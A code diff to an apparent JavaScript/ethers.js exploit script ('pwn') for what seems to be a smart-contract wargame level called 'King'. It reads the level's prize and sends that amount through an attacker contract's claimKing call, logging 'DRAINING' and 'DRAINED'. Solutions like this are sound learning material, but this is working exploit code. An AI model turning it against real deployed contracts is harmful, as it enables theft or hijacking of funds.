@@ -11,8 +11,16 @@ async function pwn() {
         ADDRESSES.hankHill,
         signer
     )
-    
-    const call = await contract.claimKing()
+    const level = new ethers.Contract(
+        LEVEL_ADDRESSES.king,
+        ["function prize() public view returns (uint prize)"],
+        signer
+    )
+    const prize = ethers.utils.formatUnits((await level.prize()), 18)
+    console.log(prize)
+    const call = await contract.claimKing({
+        value: ethers.utils.parseUnits(prize, 18)
+    })
     // const call = await signer?.sendTransaction({
     //     to: contract.address,
     //     from: PLAYER,
@@ -21,6 +29,7 @@ async function pwn() {
 
     console.log(`DRAINING`)
     const receipt = await call?.wait()
+    console.log(receipt)
     console.log("DRAINED")
 }
 
